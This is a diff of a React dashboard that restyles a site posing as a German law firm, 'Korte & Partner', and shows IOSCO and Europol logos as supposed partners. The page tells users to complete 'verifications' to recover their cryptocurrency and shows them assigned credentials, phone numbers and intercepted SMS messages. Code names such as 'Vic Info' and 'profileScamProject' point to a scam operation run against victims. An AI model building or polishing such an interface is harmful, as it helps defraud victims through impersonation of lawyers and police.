@@ -264,8 +264,8 @@ export default function Dashboard() {
 
   if (loading) {
     return (
-      <div className="min-h-screen bg-background flex items-center justify-center">
-        <Loader2 className="w-6 h-6 animate-spin text-muted-foreground" />
+      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
+        <Loader2 className="w-6 h-6 animate-spin text-slate-400" />
       </div>
     );
   }
@@ -303,12 +303,12 @@ export default function Dashboard() {
         onClick={() => goTo(view)}
         className={`relative flex items-center gap-3 w-full rounded-lg px-3 py-2.5 text-sm font-medium transition-colors ${
           isActive
-            ? "bg-primary/10 text-primary"
-            : "text-foreground/70 hover:bg-secondary hover:text-foreground"
+            ? "bg-[#0b1f3a] text-white"
+            : "text-slate-700 hover:bg-slate-100 hover:text-[#0b1f3a]"
         }`}
       >
         {isActive && (
-          <span className="absolute left-0 top-1.5 bottom-1.5 w-0.5 rounded-full bg-primary" />
+          <span className="absolute left-0 top-1.5 bottom-1.5 w-0.5 rounded-full bg-[#c9a24a]" />
         )}
         <Icon className="w-4 h-4 shrink-0" />
         <span className="truncate">{label}</span>
@@ -319,18 +319,19 @@ export default function Dashboard() {
   const SidebarInner = () => (
     <div className="flex flex-col h-full">
       {/* Logo */}
-      <div className="px-1 pb-5">
-        <span className="font-serif text-xl tracking-tight text-foreground block">
-          Korte <span className="opacity-60">&amp;</span> Partner
+      <div className="px-1 pb-4">
+        <span className="font-serif text-xl tracking-tight text-[#0b1f3a] block">
+          Korte <span className="text-[#c9a24a]">&amp;</span> Partner
         </span>
-        <p className="mt-1 text-[11px] uppercase tracking-widest text-muted-foreground/70">
+        <p className="mt-1 text-[11px] uppercase tracking-widest text-slate-500">
           Rechtsanwaltskanzlei
         </p>
+        <div className="mt-3 h-px w-full bg-[#c9a24a]/60" />
       </div>
 
       {/* Ansprechpartner */}
-      <div className="flex items-center gap-3 rounded-lg bg-secondary/60 px-3 py-3">
-        <div className="relative w-12 h-12 overflow-hidden rounded-full border border-border shrink-0">
+      <div className="flex items-center gap-3 rounded-lg bg-slate-50 border border-slate-200 px-3 py-3">
+        <div className="relative w-12 h-12 overflow-hidden rounded-full border border-[#0b1f3a]/20 shrink-0">
           <img
             src={thomasKorteAsset.url}
             alt="Dr. Thomas Korte"
@@ -338,13 +339,13 @@ export default function Dashboard() {
           />
         </div>
         <div className="min-w-0">
-          <p className="text-sm font-semibold text-foreground truncate">Dr. Thomas Korte</p>
-          <p className="text-xs text-muted-foreground truncate">Rechtsanwalt</p>
-          <p className="text-xs text-muted-foreground truncate">040 573086460</p>
+          <p className="text-sm font-semibold text-[#0b1f3a] truncate">Dr. Thomas Korte</p>
+          <p className="text-xs text-slate-600 truncate">Rechtsanwalt</p>
+          <p className="text-xs text-slate-600 truncate">040 573086460</p>
         </div>
       </div>
 
-      <Separator className="my-4" />
+      <Separator className="my-4 bg-slate-200" />
 
       {/* Navigation */}
       <nav className="space-y-1">
@@ -358,50 +359,51 @@ export default function Dashboard() {
 
       {/* Vic Info */}
       {(profileName || profileEmail || profilePhone || profileBalance !== null || profileScamProject) && (
-        <div className="rounded-lg bg-secondary/60 px-3 py-3 space-y-0.5">
+        <div className="rounded-lg bg-slate-50 border border-slate-200 px-3 py-3 space-y-0.5">
           {profileName && (
-            <p className="text-sm font-semibold text-foreground truncate">{profileName}</p>
+            <p className="text-sm font-semibold text-[#0b1f3a] truncate">{profileName}</p>
           )}
           {profileEmail && (
-            <p className="text-xs text-muted-foreground truncate">{profileEmail}</p>
+            <p className="text-xs text-slate-600 truncate">{profileEmail}</p>
           )}
           {profilePhone && (
-            <p className="text-xs text-muted-foreground truncate">{profilePhone}</p>
+            <p className="text-xs text-slate-600 truncate">{profilePhone}</p>
           )}
           {profileBalance !== null && (
-            <p className="text-xs text-foreground truncate">
-              Guthaben: {" "}
-              <span className="font-medium">
+            <p className="text-xs text-slate-700 truncate">
+              <span className="text-[#c9a24a] font-semibold tracking-wide">Guthaben:</span>{" "}
+              <span className="font-semibold text-[#0b1f3a]">
                 {new Intl.NumberFormat("de-DE", { style: "currency", currency: "EUR" }).format(profileBalance)}
               </span>
             </p>
           )}
           {profileScamProject && (
-            <p className="text-xs text-muted-foreground truncate">
-              Projekt: <span className="text-foreground">{profileScamProject}</span>
+            <p className="text-xs text-slate-600 truncate">
+              <span className="text-[#c9a24a] font-semibold tracking-wide">Projekt:</span>{" "}
+              <span className="text-[#0b1f3a]">{profileScamProject}</span>
             </p>
           )}
         </div>
       )}
 
-      <Separator className="my-4" />
+      <Separator className="my-4 bg-slate-200" />
 
       {/* Logout */}
       <Button
         variant="ghost"
         size="sm"
         onClick={handleSignOut}
-        className="w-full justify-start text-muted-foreground hover:text-destructive hover:bg-destructive/5"
+        className="w-full justify-start text-slate-600 hover:text-[#0b1f3a] hover:bg-slate-100"
       >
         <LogOut className="w-4 h-4 mr-2" />
         Abmelden
       </Button>
 
-      <Separator className="my-4" />
+      <div className="my-4 h-px w-full bg-gradient-to-r from-transparent via-[#c9a24a]/60 to-transparent" />
 
       {/* Cooperation logos */}
       <div>
-        <p className="text-[10px] uppercase tracking-widest text-muted-foreground/60 font-medium mb-3 text-center">
+        <p className="text-[10px] uppercase tracking-widest text-slate-500 font-medium mb-3 text-center">
           In Kooperation mit
         </p>
         <div className="flex flex-col items-center gap-3">
@@ -409,14 +411,14 @@ export default function Dashboard() {
             <img
               src={ioscoLogoAsset.url}
               alt="IOSCO"
-              className="max-h-full w-auto object-contain opacity-70"
+              className="max-h-full w-auto object-contain opacity-80"
             />
           </div>
           <div className="h-6 flex items-center justify-center">
             <img
               src={europolLogo}
               alt="Europol"
-              className="max-h-full w-auto object-contain opacity-70"
+              className="max-h-full w-auto object-contain opacity-80"
             />
           </div>
         </div>
@@ -425,17 +427,17 @@ export default function Dashboard() {
   );
 
   return (
-    <div className="min-h-screen bg-muted/30">
+    <div className="min-h-screen bg-slate-50">
       {/* Mobile Top Bar */}
-      <header className="lg:hidden sticky top-0 z-20 border-b border-border bg-card/90 backdrop-blur-sm">
+      <header className="lg:hidden sticky top-0 z-20 border-b border-slate-200 bg-white/95 backdrop-blur-sm">
         <div className="flex relative h-14 items-center justify-center px-4">
           <Sheet>
             <SheetTrigger asChild>
-              <Button variant="ghost" size="icon" className="absolute left-3 top-1/2 -translate-y-1/2">
+              <Button variant="ghost" size="icon" className="absolute left-3 top-1/2 -translate-y-1/2 text-[#0b1f3a] hover:bg-slate-100">
                 <Menu className="w-5 h-5" />
               </Button>
             </SheetTrigger>
-            <SheetContent side="left" className="w-72 p-6">
+            <SheetContent side="left" className="w-72 p-6 bg-white">
               <SheetHeader className="sr-only">
                 <SheetTitle>Menü</SheetTitle>
               </SheetHeader>
@@ -444,8 +446,8 @@ export default function Dashboard() {
               </div>
             </SheetContent>
           </Sheet>
-          <span className="font-serif text-lg tracking-tight text-foreground">
-            Korte <span className="opacity-60">&amp;</span> Partner
+          <span className="font-serif text-lg tracking-tight text-[#0b1f3a]">
+            Korte <span className="text-[#c9a24a]">&amp;</span> Partner
           </span>
         </div>
       </header>
@@ -454,7 +456,7 @@ export default function Dashboard() {
         <div className="lg:grid lg:grid-cols-4 lg:gap-8">
           {/* Sidebar Card (desktop) */}
           <aside className="hidden lg:block lg:col-span-1">
-            <div className="sticky top-8 h-[calc(100vh-4rem)] rounded-xl border border-border bg-card shadow-sm p-6 flex flex-col overflow-y-auto">
+            <div className="sticky top-8 h-[calc(100vh-4rem)] rounded-xl border border-slate-200 bg-white shadow-sm p-6 flex flex-col overflow-y-auto">
               <SidebarInner />
             </div>
           </aside>
@@ -477,10 +479,10 @@ export default function Dashboard() {
             <VerificationLogo
               value={selected.verification?.logo_url ?? null}
               alt={selected.verification?.title ?? ""}
-              className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2"
+              className="w-14 h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2"
             />
             <div className="flex-1 min-w-0">
-              <h1 className="text-2xl font-bold text-foreground tracking-tight truncate">
+              <h1 className="font-serif text-2xl sm:text-3xl font-semibold text-[#0b1f3a] tracking-tight truncate">
                 {selected.verification?.title ?? "Auftrag"}
               </h1>
               <div className="mt-1.5">
@@ -503,14 +505,14 @@ export default function Dashboard() {
               if (steps.length === 0) return null;
               return (
                 <div>
-                  <h3 className="text-sm font-medium text-foreground mb-3">Anleitung</h3>
+                  <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Anleitung</h3>
                   <ol className="space-y-3">
                     {steps.map((step, i) => (
                       <li key={i} className="flex gap-3 items-start">
-                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary/10 text-primary text-xs font-semibold flex items-center justify-center mt-0.5">
+                        <span className="flex-shrink-0 w-6 h-6 rounded-full bg-[#0b1f3a] text-white text-xs font-semibold flex items-center justify-center mt-0.5">
                           {i + 1}
                         </span>
-                        <span className="text-sm text-foreground/80 leading-relaxed">{step}</span>
+                        <span className="text-sm text-slate-700 leading-relaxed">{step}</span>
                       </li>
                     ))}
                   </ol>
@@ -536,16 +538,16 @@ export default function Dashboard() {
             {/* Credentials - Ordered */}
             {getOrderedCredentials(selected.field_values).length > 0 && (
               <div>
-                <h3 className="text-sm font-medium text-foreground mb-3">Zugangsdaten</h3>
+                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugangsdaten</h3>
                 <div className="space-y-2">
                   {getOrderedCredentials(selected.field_values).map(([key, value]) => (
                     <div
                       key={key}
-                      className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
+                      className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                     >
                       <div className="min-w-0 flex-1">
-                        <p className="text-xs text-muted-foreground">{FIELD_LABELS[key] ?? key}</p>
-                        <p className="text-sm font-mono font-medium text-foreground truncate">{value}</p>
+                        <p className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">{FIELD_LABELS[key] ?? key}</p>
+                        <p className="text-sm font-mono font-semibold text-[#0b1f3a] truncate">{value}</p>
                       </div>
                       <Button
                         variant="ghost"
@@ -568,11 +570,11 @@ export default function Dashboard() {
             {/* Phone number */}
             {selected.phone_number && (
               <div>
-                <h3 className="text-sm font-medium text-foreground mb-3">Zugewiesene Telefonnummer</h3>
-                <div className="flex items-center justify-between rounded-xl border border-border bg-secondary/50 px-4 py-3 group">
+                <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] mb-3 uppercase">Zugewiesene Telefonnummer</h3>
+                <div className="flex items-center justify-between rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group">
                   <div>
-                    <p className="text-xs text-muted-foreground">Telefonnummer</p>
-                    <p className="text-sm font-mono font-medium text-foreground">{selected.phone_number}</p>
+                    <p className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Telefonnummer</p>
+                    <p className="text-sm font-mono font-semibold text-[#0b1f3a]">{selected.phone_number}</p>
                   </div>
                   <Button
                     variant="ghost"
@@ -594,14 +596,14 @@ export default function Dashboard() {
             {selected.phone_token && selected.sms_monitoring_active && (
               <div>
                 <div className="flex items-center gap-2 mb-3">
-                  <MessageSquare className="w-4 h-4 text-muted-foreground" />
-                  <h3 className="text-sm font-medium text-foreground">SMS-Nachrichten</h3>
-                  {smsLoading && <Loader2 className="w-3.5 h-3.5 animate-spin text-muted-foreground" />}
+                  <MessageSquare className="w-4 h-4 text-[#c9a24a]" />
+                  <h3 className="text-xs font-semibold tracking-[0.2em] text-[#c9a24a] uppercase">SMS-Nachrichten</h3>
+                  {smsLoading && <Loader2 className="w-3.5 h-3.5 animate-spin text-slate-400" />}
                 </div>
                 
                 {smsMessages.length === 0 ? (
-                  <div className="rounded-xl border border-border bg-secondary/30 px-4 py-6 text-center">
-                    <p className="text-sm text-muted-foreground">
+                  <div className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-6 text-center">
+                    <p className="text-sm text-slate-500">
                       {smsLoading ? "Lade SMS..." : "Noch keine SMS seit Zuweisung eingegangen"}
                     </p>
                   </div>
@@ -610,15 +612,15 @@ export default function Dashboard() {
                     {smsMessages.map((sms, i) => (
                       <div
                         key={`${sms.messageDate}-${i}`}
-                        className="rounded-xl border border-border bg-secondary/50 px-4 py-3 group"
+                        className="rounded-lg border border-slate-200 bg-slate-50 px-4 py-3 group"
                       >
                         <div className="flex items-start justify-between gap-3">
                           <div className="min-w-0 flex-1">
                             <div className="flex items-center gap-2 mb-1">
-                              <span className="text-xs font-medium text-primary">{sms.messageSender}</span>
-                              <span className="text-xs text-muted-foreground">{formatSmsDate(sms.messageDate)}</span>
+                              <span className="text-xs font-semibold text-[#0b1f3a]">{sms.messageSender}</span>
+                              <span className="text-xs text-slate-500">{formatSmsDate(sms.messageDate)}</span>
                             </div>
-                            <p className="text-sm text-foreground break-words">{sms.messageText}</p>
+                            <p className="text-sm text-slate-700 break-words">{sms.messageText}</p>
                           </div>
                           <Button
                             variant="ghost"
@@ -674,7 +676,7 @@ export default function Dashboard() {
             {(selected.status === "zugewiesen" || selected.status === "abgelehnt") && (
               <AlertDialog>
                 <AlertDialogTrigger asChild>
-                  <Button className="w-full" size="lg">
+                  <Button className="w-full bg-[#0b1f3a] hover:bg-[#0b1f3a]/90 text-white" size="lg">
                     <Send className="w-4 h-4 mr-2" />
                     Auftrag abschließen
                   </Button>
@@ -731,10 +733,10 @@ export default function Dashboard() {
         <main className="max-w-5xl mx-auto w-full px-6">
           {/* Hero */}
           <div className="pt-16 pb-12 text-center opacity-0 animate-fade-in" style={{ animationDelay: "0ms", animationFillMode: "forwards" }}>
-            <h1 className="text-4xl sm:text-5xl font-bold tracking-tight text-foreground">
+            <h1 className="font-serif text-4xl sm:text-5xl font-semibold tracking-tight text-[#0b1f3a]">
               Willkommen zurück
             </h1>
-            <p className="mt-4 text-lg text-muted-foreground max-w-3xl mx-auto leading-relaxed">
+            <p className="mt-4 text-base text-slate-600 max-w-3xl mx-auto leading-relaxed">
               Bitte führen Sie die folgenden Verifikationen durch, um Ihre Kryptowährungen sicher auf Ihr Konto zurückzuführen.<br />
               Klicken Sie auf einen Auftrag, um die Anleitung und Zugangsdaten einzusehen.
             </p>
@@ -747,21 +749,21 @@ export default function Dashboard() {
               <Card
                 key={a.id}
                 onClick={() => setSelectedId(a.id)}
-                className="border-border bg-card shadow-none cursor-pointer transition-all duration-200 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 group"
+                className="border-slate-200 bg-white shadow-sm cursor-pointer transition-all duration-200 hover:border-[#0b1f3a]/40 hover:shadow-md hover:shadow-[#0b1f3a]/10 group"
               >
                 <CardContent className="p-0 aspect-square flex flex-col items-center justify-center text-center gap-3 px-4">
                   <VerificationLogo
                     value={a.verification?.logo_url ?? null}
                     alt={a.verification?.title ?? ""}
-                    className="w-14 h-14 rounded-2xl object-contain bg-secondary p-2 transition-transform duration-200 group-hover:scale-105"
+                    className="w-14 h-14 rounded-xl object-contain bg-slate-50 border border-slate-200 p-2 transition-transform duration-200 group-hover:scale-105"
                     fallback={
-                      <div className="w-14 h-14 rounded-2xl bg-secondary flex items-center justify-center">
-                        <span className="text-xl font-bold text-muted-foreground">{(a.verification?.title ?? "A").charAt(0)}</span>
+                      <div className="w-14 h-14 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-center">
+                        <span className="text-xl font-bold text-slate-400">{(a.verification?.title ?? "A").charAt(0)}</span>
                       </div>
                     }
                   />
                   <div className="space-y-1.5">
-                    <p className="text-sm font-semibold text-foreground truncate max-w-full">
+                    <p className="text-sm font-semibold text-[#0b1f3a] truncate max-w-full">
                       {a.verification?.title ?? "Auftrag"}
                     </p>
                     <AssignmentStatusBadge status={a.status} />
@@ -774,10 +776,10 @@ export default function Dashboard() {
             {PLACEHOLDER_CARDS.map((p, i) => (
               <div
                 key={`placeholder-${i}`}
-                className="aspect-square rounded-lg border-2 border-dashed border-border/60 flex flex-col items-center justify-center text-center gap-2 px-4"
+                className="aspect-square rounded-lg border-2 border-dashed border-slate-200 flex flex-col items-center justify-center text-center gap-2 px-4"
               >
-                <Lock className="w-5 h-5 text-muted-foreground/40" />
-                <p className="text-xs font-medium text-muted-foreground/50">
+                <Lock className="w-5 h-5 text-slate-300" />
+                <p className="text-xs font-medium text-slate-400">
                   {p.label}
                 </p>
               </div>
